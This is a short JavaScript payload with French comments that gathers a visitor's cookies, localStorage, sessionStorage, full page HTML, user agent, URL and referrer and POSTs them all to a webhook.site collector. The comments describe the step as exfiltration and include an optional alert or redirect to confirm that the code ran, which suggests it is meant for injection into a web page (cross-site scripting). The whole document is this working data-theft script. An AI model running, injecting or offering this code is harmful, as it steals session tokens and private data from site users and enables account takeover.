// 1. Exfiltre les cookies, localStorage, DOM, userAgent, et la page HTML
const data = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    dom: document.documentElement.innerHTML,
    userAgent: navigator.userAgent,
    url: window.location.href,
    referrer: document.referrer,
  };
  
  // 2. Envoi des données vers votre webhook
  fetch('https://webhook.site/bf17564a-dae7-4a76-9ff8-239b0ff3cdc5', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data),
  })
  .then(response => response.text())
  .then(result => console.log('Success:', result))
  .catch(error => console.error('Error:', error));
  
  // 3. Optionnel : Redirection ou alerte pour confirmer l'exécution
  //alert('Données envoyées au webhook !');
  // window.location.href = "https://google.com"; // Redirection si nécessaire